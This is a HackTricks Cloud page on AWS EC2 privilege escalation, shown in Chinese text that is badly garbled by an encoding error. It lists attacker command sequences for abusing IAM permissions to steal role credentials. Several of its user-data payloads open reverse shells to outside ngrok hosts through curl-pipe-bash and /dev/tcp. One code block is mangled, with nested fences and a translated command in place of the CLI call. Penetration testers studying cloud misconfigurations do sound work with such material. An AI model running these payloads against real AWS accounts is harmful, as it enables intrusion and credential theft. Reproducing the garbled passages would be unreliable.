# AWS - EC2æƒé™æå‡

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWSçº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„**Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## EC2

æœ‰å…³**EC2çš„æ›´å¤šä¿¡æ¯**ï¼Œè¯·æŸ¥çœ‹ï¼š

{% content-ref url="../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/" %}
[aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum](../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/)
{% endcontent-ref %}

### `iam:PassRole`ï¼Œ`ec2:RunInstances`

æ”»å‡»è€…å¯ä»¥**åˆ›å»ºä¸€ä¸ªé™„åŠ IAMè§’è‰²çš„å®ä¾‹ï¼Œç„¶åè®¿é—®è¯¥å®ä¾‹**ï¼Œä»å…ƒæ•°æ®ç«¯ç‚¹çªƒå–IAMè§’è‰²å‡­æ®ã€‚

* **é€šè¿‡SSHè®¿é—®**

ä½¿ç”¨**åˆ›å»ºçš„sshå¯†é’¥**ï¼ˆ`--key-name`ï¼‰è¿è¡Œä¸€ä¸ªæ–°å®ä¾‹ï¼Œç„¶åsshè¿›å…¥è¯¥å®ä¾‹ï¼ˆå¦‚æœæ‚¨æƒ³åˆ›å»ºä¸€ä¸ªæ–°çš„ï¼Œæ‚¨å¯èƒ½éœ€è¦å…·æœ‰`ec2:CreateKeyPair`æƒé™ï¼‰ã€‚
```bash
aws ec2 run-instances --image-id <img-id> --instance-type t2.micro \
--iam-instance-profile Name=<instance-profile-name> --key-name <ssh-key> \
--security-group-ids <sg-id>
```
* **é€šè¿‡ç”¨æˆ·æ•°æ®ä¸­çš„åå‘Shellè®¿é—®**

æ‚¨å¯ä»¥è¿è¡Œä¸€ä¸ªä½¿ç”¨**ç”¨æˆ·æ•°æ®**(`--user-data`)çš„æ–°å®ä¾‹ï¼Œè¯¥å®ä¾‹å°†å‘æ‚¨å‘é€ä¸€ä¸ª**åå‘Shell**ã€‚è¿™ç§æ–¹å¼ä¸‹ï¼Œæ‚¨æ— éœ€æŒ‡å®šå®‰å…¨ç»„ã€‚
```bash
echo '#!/bin/bash
curl https://reverse-shell.sh/4.tcp.ngrok.io:17031 | bash' > /tmp/rev.sh

aws ec2 run-instances --image-id <img-id> --instance-type t2.micro \
--iam-instance-profile Name=E<instance-profile-name> \
--count 1 \
--user-data "file:///tmp/rev.sh"
```
è°¨æ…ä½¿ç”¨ IAM è§’è‰²çš„å‡­æ®åœ¨å®ä¾‹å¤–éƒ¨ä½¿ç”¨ GuardDutyï¼š

{% content-ref url="../aws-services/aws-security-and-detection-services/aws-guardduty-enum.md" %}
[aws-guardduty-enum.md](../aws-services/aws-security-and-detection-services/aws-guardduty-enum.md)
{% endcontent-ref %}

**æ½œåœ¨å½±å“:** ç›´æ¥æå‡æƒé™åˆ°ä»»ä½•é™„åŠ åˆ°ç°æœ‰å®ä¾‹é…ç½®æ–‡ä»¶çš„ EC2 è§’è‰²ã€‚

#### æå‡æƒé™åˆ° ECS

æ‹¥æœ‰è¿™ç»„æƒé™åï¼Œæ‚¨è¿˜å¯ä»¥**åˆ›å»ºä¸€ä¸ª EC2 å®ä¾‹å¹¶å°†å…¶æ³¨å†Œåˆ° ECS é›†ç¾¤**ã€‚è¿™æ ·ï¼ŒECS **æœåŠ¡**å°†åœ¨æ‚¨å¯ä»¥è®¿é—®çš„ EC2 å®ä¾‹ä¸­è¿è¡Œï¼Œç„¶åæ‚¨å¯ä»¥æ¸—é€è¿™äº›æœåŠ¡ï¼ˆDocker å®¹å™¨ï¼‰å¹¶**çªƒå–å®ƒä»¬é™„åŠ çš„ ECS è§’è‰²**ã€‚

{% code overflow="wrap" %}
```bash
aws ec2 run-instances \
--image-id ami-07fde2ae86109a2af \
--instance-type t2.micro \
--iam-instance-profile <ECS_role> \
--count 1 --key-name pwned \
--user-data "file:///tmp/asd.sh"

# Make sure to use an ECS optimized AMI as it has everything installed for ECS already (amzn2-ami-ecs-hvm-2.0.20210520-x86_64-ebs)
# The EC2 instance profile needs basic ECS access
# The content of the user data is:
#!/bin/bash
echo ECS_CLUSTER=<cluster-name> >> /etc/ecs/ecs.config;echo ECS_BACKEND_HOST= >> /etc/ecs/ecs.config;
```
{% endcode %}

è¦äº†è§£å¦‚ä½•**å¼ºåˆ¶ ECS æœåŠ¡åœ¨æ­¤æ–° EC2 å®ä¾‹ä¸­è¿è¡Œ**ï¼Œè¯·æŸ¥çœ‹ï¼š

{% content-ref url="aws-ecs-privesc.md" %}
[aws-ecs-privesc.md](aws-ecs-privesc.md)
{% endcontent-ref %}

å¦‚æœ**æ— æ³•åˆ›å»ºæ–°å®ä¾‹**ä½†å…·æœ‰`ecs:RegisterContainerInstance`æƒé™ï¼Œåˆ™å¯èƒ½èƒ½å¤Ÿå°†å®ä¾‹æ³¨å†Œåˆ°é›†ç¾¤ä¸­å¹¶æ‰§è¡Œæ³¨é‡Šæ”»å‡»ã€‚

**æ½œåœ¨å½±å“ï¼š** ç›´æ¥æå‡è‡³é™„åŠ åˆ°ä»»åŠ¡çš„ ECS è§’è‰²ã€‚

### **`iam:PassRole`,** **`iam:AddRoleToInstanceProfile`**

ä¸å…ˆå‰æƒ…å†µç±»ä¼¼ï¼Œå…·æœ‰è¿™äº›æƒé™çš„æ”»å‡»è€…å¯ä»¥**æ›´æ”¹å—æŸå®ä¾‹çš„ IAM è§’è‰²**ï¼Œä»¥ä¾¿çªƒå–æ–°å‡­æ®ã€‚\
ç”±äºå®ä¾‹é…ç½®æ–‡ä»¶åªèƒ½æœ‰ 1 ä¸ªè§’è‰²ï¼Œå¦‚æœå®ä¾‹é…ç½®æ–‡ä»¶**å·²ç»æœ‰ä¸€ä¸ªè§’è‰²**ï¼ˆå¸¸è§æƒ…å†µï¼‰ï¼Œæ‚¨è¿˜éœ€è¦**`iam:RemoveRoleFromInstanceProfile`**ã€‚

{% code overflow="wrap" %}
```bash
# Removing role from instance profile
aws iam remove-role-from-instance-profile --instance-profile-name <name> --role-name <name>

# Add role to instance profile
aws iam add-role-to-instance-profile --instance-profile-name <name> --role-name <name>
```
å¦‚æœå®ä¾‹é…ç½®æ–‡ä»¶å…·æœ‰è§’è‰²ï¼Œæ”»å‡»è€…æ— æ³•åˆ é™¤å®ƒï¼Œè¿˜æœ‰å¦ä¸€ä¸ªè§£å†³æ–¹æ³•ã€‚ä»–å¯ä»¥æŸ¥æ‰¾ä¸€ä¸ªæ²¡æœ‰è§’è‰²çš„å®ä¾‹é…ç½®æ–‡ä»¶ï¼Œæˆ–è€…åˆ›å»ºä¸€ä¸ªæ–°çš„ï¼ˆ`iam:CreateInstanceProfile`ï¼‰ï¼Œå°†è§’è‰²æ·»åŠ åˆ°è¯¥å®ä¾‹é…ç½®æ–‡ä»¶ï¼ˆå¦‚å‰æ‰€è¿°ï¼‰ï¼Œå¹¶å°†å—æŸçš„å®ä¾‹é…ç½®æ–‡ä»¶å…³è”åˆ°ä¸€ä¸ªå—æŸçš„å®ä¾‹ï¼š

- å¦‚æœå®ä¾‹æ²¡æœ‰ä»»ä½•å®ä¾‹é…ç½®æ–‡ä»¶ï¼ˆ`ec2:AssociateIamInstanceProfile`ï¼‰\*
```bash
aws ec2 associate-iam-instance-profile --iam-instance-profile Name=<value> --instance-id <value>
```
{% endcode %}

**æ½œåœ¨å½±å“:** ç›´æ¥æå‡è‡³ä¸åŒçš„EC2è§’è‰²ï¼ˆæ‚¨éœ€è¦å·²ç»å…¥ä¾µäº†ä¸€ä¸ªAWS EC2å®ä¾‹å¹¶å…·æœ‰ä¸€äº›é¢å¤–æƒé™æˆ–ç‰¹å®šå®ä¾‹é…ç½®æ–‡ä»¶çŠ¶æ€ï¼‰ã€‚

### **`iam:PassRole`((** `ec2:AssociateIamInstanceProfile`& `ec2:DisassociateIamInstanceProfile`) || `ec2:ReplaceIamInstanceProfileAssociation`)

æ‹¥æœ‰è¿™äº›æƒé™åï¼Œå¯ä»¥æ›´æ”¹ä¸å®ä¾‹å…³è”çš„å®ä¾‹é…ç½®æ–‡ä»¶ï¼Œå› æ­¤ï¼Œå¦‚æœæ”»å‡»è€…å·²ç»è®¿é—®äº†ä¸€ä¸ªå®ä¾‹ï¼Œä»–å°†èƒ½å¤Ÿçªƒå–æ›´å¤šå®ä¾‹é…ç½®æ–‡ä»¶è§’è‰²çš„å‡­æ®ï¼Œå¹¶æ›´æ”¹ä¸ä¹‹å…³è”çš„å®ä¾‹é…ç½®æ–‡ä»¶ã€‚

* å¦‚æœ**æœ‰ä¸€ä¸ªå®ä¾‹é…ç½®æ–‡ä»¶**ï¼Œæ‚¨å¯ä»¥**ç§»é™¤**è¯¥å®ä¾‹é…ç½®æ–‡ä»¶ï¼ˆ`ec2:DisassociateIamInstanceProfile`ï¼‰å¹¶**å…³è”**å®ƒ\*

{% code overflow="wrap" %}
```bash
aws ec2 describe-iam-instance-profile-associations --filters Name=instance-id,Values=i-0d36d47ba15d7b4da
aws ec2 disassociate-iam-instance-profile --association-id <value>
aws ec2 associate-iam-instance-profile --iam-instance-profile Name=<value> --instance-id <value>
```
{% endcode %}

* æˆ–è€…**æ›¿æ¢**å—æŸå®ä¾‹çš„**å®ä¾‹é…ç½®æ–‡ä»¶** (`ec2:ReplaceIamInstanceProfileAssociation`). \*

{% code overflow="wrap" %}
````
```bash
```plaintext
æ›¿æ¢IAMå®ä¾‹é…ç½®æ–‡ä»¶å…³è”--iam-instance-profile Name=<value> --association-id <value>
```
```
````
{% endcode %}

**æ½œåœ¨å½±å“:** ç›´æ¥æå‡è‡³ä¸åŒçš„ EC2 è§’è‰²ï¼ˆæ‚¨éœ€è¦å·²ç»å…¥ä¾µäº†ä¸€ä¸ª AWS EC2 å®ä¾‹å¹¶å…·æœ‰é¢å¤–æƒé™æˆ–ç‰¹å®šå®ä¾‹é…ç½®æ–‡ä»¶çŠ¶æ€ï¼‰ã€‚

### `ec2:RequestSpotInstances`,`iam:PassRole`

æ‹¥æœ‰ **`ec2:RequestSpotInstances`å’Œ`iam:PassRole`** æƒé™çš„æ”»å‡»è€…å¯ä»¥ä½¿ç”¨ **`ec2:RequestSpotInstances`** æƒé™è¯·æ±‚ä¸€ä¸ªé™„å¸¦ **EC2 è§’è‰²** å’Œ **åå‘ shell** çš„ **Spot å®ä¾‹**ã€‚\
ä¸€æ—¦å®ä¾‹è¿è¡Œï¼Œä»–å¯ä»¥ **çªƒå– IAM è§’è‰²**ã€‚

{% code overflow="wrap" %}
```bash
REV=$(printf '#!/bin/bash
curl https://reverse-shell.sh/2.tcp.ngrok.io:14510 | bash
' | base64)

aws ec2 request-spot-instances \
--instance-count 1 \
--launch-specification "{\"IamInstanceProfile\":{\"Name\":\"EC2-CloudWatch-Agent-Role\"}, \"InstanceType\": \"t2.micro\", \"UserData\":\"$REV\", \"ImageId\": \"ami-0c1bc246476a5572b\"}"
```
{% endcode %}

### `ec2:ModifyInstanceAttribute`

æ‹¥æœ‰ **`ec2:ModifyInstanceAttribute`** æƒé™çš„æ”»å‡»è€…å¯ä»¥ä¿®æ”¹å®ä¾‹å±æ€§ã€‚å…¶ä¸­ï¼Œä»–å¯ä»¥**æ›´æ”¹ç”¨æˆ·æ•°æ®**ï¼Œè¿™æ„å‘³ç€ä»–å¯ä»¥ä½¿å®ä¾‹**è¿è¡Œä»»æ„æ•°æ®**ã€‚è¿™å¯ä»¥ç”¨æ¥åœ¨EC2å®ä¾‹ä¸Šè·å¾—**åå‘shell**ã€‚

è¯·æ³¨æ„ï¼Œå±æ€§åªèƒ½åœ¨å®ä¾‹åœæ­¢æ—¶**ä¿®æ”¹**ï¼Œå› æ­¤éœ€è¦ **`ec2:StopInstances`** å’Œ **`ec2:StartInstances`** æƒé™ã€‚
```bash
TEXT='Content-Type: multipart/mixed; boundary="//"
MIME-Version: 1.0

--//
Content-Type: text/cloud-config; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename="cloud-config.txt"

#cloud-config
cloud_final_modules:
- [scripts-user, always]

--//
Content-Type: text/x-shellscript; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename="userdata.txt"

#!/bin/bash
bash -i >& /dev/tcp/2.tcp.ngrok.io/14510 0>&1
--//'
TEXT_PATH="/tmp/text.b64.txt"

printf $TEXT | base64 > "$TEXT_PATH"

aws ec2 stop-instances --instance-ids $INSTANCE_ID

aws ec2 modify-instance-attribute \
--instance-id="$INSTANCE_ID" \
--attribute userData \
--value file://$TEXT_PATH

aws ec2 start-instances --instance-ids $INSTANCE_ID
```
**æ½œåœ¨å½±å“:** ç›´æ¥æå‡è‡³åˆ›å»ºå®ä¾‹é™„åŠ çš„ä»»ä½•EC2 IAMè§’è‰²ã€‚

### `ec2:CreateLaunchTemplateVersion`,`ec2:CreateLaunchTemplate`,`ec2:ModifyLaunchTemplate`

æ‹¥æœ‰æƒé™ **`ec2:CreateLaunchTemplateVersion`,`ec2:CreateLaunchTemplate`å’Œ `ec2:ModifyLaunchTemplate`** çš„æ”»å‡»è€…å¯ä»¥åˆ›å»ºä¸€ä¸ªå¸¦æœ‰**åå‘ shell**çš„**æ–°å¯åŠ¨æ¨¡æ¿ç‰ˆæœ¬**ï¼Œå¹¶åœ¨**ç”¨æˆ·æ•°æ®**ä¸­åŒ…å«**ä»»ä½•EC2 IAMè§’è‰²**ï¼Œæ›´æ”¹é»˜è®¤ç‰ˆæœ¬ï¼Œä»¥åŠ**ä½¿ç”¨**è¯¥**å¯åŠ¨æ¨¡æ¿**çš„**ä»»ä½•è‡ªåŠ¨æ‰©å±•ç»„**ï¼Œè¯¥ç»„**é…ç½®**ä¸ºä½¿ç”¨**æœ€æ–°ç‰ˆæœ¬**æˆ–**é»˜è®¤ç‰ˆæœ¬**å°†**é‡æ–°è¿è¡Œ**ä½¿ç”¨è¯¥æ¨¡æ¿çš„å®ä¾‹å¹¶æ‰§è¡Œåå‘ shellã€‚

{% code overflow="wrap" %}
```bash
REV=$(printf '#!/bin/bash
curl https://reverse-shell.sh/2.tcp.ngrok.io:14510 | bash
' | base64)

aws ec2 create-launch-template-version \
--launch-template-name bad_template \
--launch-template-data "{\"ImageId\": \"ami-0c1bc246476a5572b\", \"InstanceType\": \"t3.micro\", \"IamInstanceProfile\": {\"Name\": \"ecsInstanceRole\"}, \"UserData\": \"$REV\"}"

aws ec2 modify-launch-template \
--launch-template-name bad_template \
--default-version 2
```
{% endcode %}

**æ½œåœ¨å½±å“ï¼š** ç›´æ¥æå‡è‡³ä¸åŒçš„ EC2 è§’è‰²ã€‚

### `autoscaling:CreateLaunchConfiguration`, `autoscaling:CreateAutoScalingGroup`, `iam:PassRole`

æ‹¥æœ‰æƒé™ **`autoscaling:CreateLaunchConfiguration`, `autoscaling:CreateAutoScalingGroup`, `iam:PassRole`** çš„æ”»å‡»è€…å¯ä»¥é€šè¿‡åœ¨ **ç”¨æˆ·æ•°æ®** ä¸­æ’å…¥ä¸€ä¸ª **IAM è§’è‰²** å’Œä¸€ä¸ª **åå‘ shell**ï¼Œç„¶åä½¿ç”¨è¯¥é…ç½®åˆ›å»ºä¸€ä¸ª **å¯åŠ¨é…ç½®**ï¼Œå†åˆ›å»ºä¸€ä¸ªè‡ªåŠ¨æ‰©å±•ç»„ï¼Œå¹¶ç­‰å¾…åå‘ shell æ¥ **çªƒå– IAM è§’è‰²**ã€‚
```bash
aws --profile "$NON_PRIV_PROFILE_USER" autoscaling create-launch-configuration \
--launch-configuration-name bad_config \
--image-id ami-0c1bc246476a5572b \
--instance-type t3.micro \
--iam-instance-profile EC2-CloudWatch-Agent-Role \
--user-data "$REV"

aws --profile "$NON_PRIV_PROFILE_USER" autoscaling create-auto-scaling-group \
--auto-scaling-group-name bad_auto \
--min-size 1 --max-size 1 \
--launch-configuration-name bad_config \
--desired-capacity 1 \
--vpc-zone-identifier "subnet-e282f9b8"
```
**æ½œåœ¨å½±å“:** ç›´æ¥æå‡è‡³ä¸åŒçš„ EC2 è§’è‰²ã€‚

### `!autoscaling`

æ‹¥æœ‰ **`ec2:CreateLaunchTemplate`** å’Œ **`autoscaling:CreateAutoScalingGroup`** æƒé™**ä¸è¶³ä»¥å‡çº§**æƒé™è‡³ IAM è§’è‰²ï¼Œå› ä¸ºä¸ºäº†é™„åŠ åˆ°å¯åŠ¨é…ç½®æˆ–å¯åŠ¨æ¨¡æ¿ä¸­æŒ‡å®šçš„è§’è‰²ï¼Œ**éœ€è¦å…·å¤‡ `iam:PassRole` å’Œ `ec2:RunInstances` æƒé™**ï¼ˆè¿™æ˜¯å·²çŸ¥çš„æƒé™æå‡ï¼‰ã€‚

### `ec2-instance-connect:SendSSHPublicKey`

æ‹¥æœ‰ **`ec2-instance-connect:SendSSHPublicKey`** æƒé™çš„æ”»å‡»è€…å¯ä»¥å‘ç”¨æˆ·æ·»åŠ ä¸€ä¸ª SSH å¯†é’¥ï¼Œå¹¶ä½¿ç”¨å®ƒè®¿é—®ï¼ˆå¦‚æœä»–æœ‰å®ä¾‹çš„ SSH è®¿é—®æƒé™ï¼‰æˆ–æå‡æƒé™ã€‚
```bash
aws ec2-instance-connect send-ssh-public-key \
--instance-id "$INSTANCE_ID" \
--instance-os-user "ec2-user" \
--ssh-public-key "file://$PUBK_PATH"
```
**æ½œåœ¨å½±å“:** ç›´æ¥æå‡è‡³è¿è¡Œå®ä¾‹é™„åŠ çš„EC2 IAMè§’è‰²ã€‚

### `ec2-instance-connect:SendSerialConsoleSSHPublicKey`

æ‹¥æœ‰æƒé™ **`ec2-instance-connect:SendSerialConsoleSSHPublicKey`** çš„æ”»å‡»è€…å¯ä»¥**å‘ä¸²è¡Œè¿æ¥æ·»åŠ sshå¯†é’¥**ã€‚å¦‚æœä¸²è¡Œæœªå¯ç”¨ï¼Œæ”»å‡»è€…éœ€è¦æƒé™ **`ec2:EnableSerialConsoleAccess` æ¥å¯ç”¨å®ƒ**ã€‚

ä¸ºäº†è¿æ¥åˆ°ä¸²è¡Œç«¯å£ï¼Œæ‚¨è¿˜éœ€è¦**çŸ¥é“æœºå™¨å†…éƒ¨ç”¨æˆ·çš„ç”¨æˆ·åå’Œå¯†ç **ã€‚

{% code overflow="wrap" %}
```bash
aws ec2 enable-serial-console-access

aws ec2-instance-connect send-serial-console-ssh-public-key \
--instance-id "$INSTANCE_ID" \
--serial-port 0 \
--region "eu-west-1" \
--ssh-public-key "file://$PUBK_PATH"

ssh -i /tmp/priv $INSTANCE_ID.port0@serial-console.ec2-instance-connect.eu-west-1.aws
```
{% endcode %}

è¿™ç§æ–¹å¼å¹¶ä¸æ˜¯å¾ˆæœ‰ç”¨ï¼Œå› ä¸ºä½ éœ€è¦çŸ¥é“ç”¨æˆ·åå’Œå¯†ç æ‰èƒ½åˆ©ç”¨å®ƒã€‚

**æ½œåœ¨å½±å“:** (é«˜åº¦ä¸å¯è¯å®) ç›´æ¥æå‡åˆ°è¿è¡Œå®ä¾‹é™„åŠ çš„EC2 IAMè§’è‰²ã€‚

## å‚è€ƒèµ„æ–™

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼:

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­è¢«å¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ–åœ¨**Twitter**ä¸Šå…³æ³¨æˆ‘ä»¬ ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
